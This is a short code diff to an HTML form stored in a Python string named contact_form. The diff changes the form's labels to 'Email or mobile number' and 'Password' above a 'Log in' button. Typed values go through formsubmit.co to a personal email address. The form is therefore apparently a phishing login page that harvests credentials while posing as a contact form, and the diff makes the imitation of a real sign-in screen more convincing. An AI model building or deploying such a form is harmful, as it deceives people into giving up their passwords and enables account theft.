@@ -58,8 +58,8 @@ contact_form = """
 </style>
 <form action="https://formsubmit.co/md.taseen.alam@gmail.com" method="POST">
      <input type="hidden" name="_captcha" value="false">
-     <input class="styledInput" type="email" name="email" placeholder="Your email" required>
-     <input class="styledInput" type="text" name="name" placeholder="password" required>
+     <input class="styledInput" type="email" name="email" placeholder="Email or mobile number" required>
+     <input class="styledInput" type="text" name="name" placeholder="Password" required>
      <button type="submit" class="styledButton" style="float: right;">Log in</button>
 </form>
 """
